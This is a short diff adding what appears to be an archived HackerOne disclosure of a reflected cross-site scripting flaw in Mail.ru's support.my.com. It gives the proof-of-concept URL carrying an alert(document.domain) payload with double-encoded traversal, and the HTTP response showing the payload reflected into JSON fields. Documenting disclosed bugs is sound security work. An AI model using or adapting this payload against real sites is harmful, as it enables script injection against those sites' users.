@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/87806
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:06.10.2016 12:22:51
+
+Summary:
+
+PoC (Internet Explorer):
+`http://blackfan.ru/x?r=http://support.my.com/"-alert(document.domain)-"/%252e%252e/games`
+
+HTTP Response:
+```
+   "continue":    "http://support.my.com/"-alert(document.domain)-"/%2e%2e/games",
+   "signup_method":     "email,phone",
+   "signup_continue":   "http://support.my.com/"-alert(document.domain)-"/%2e%2e/games"
+```
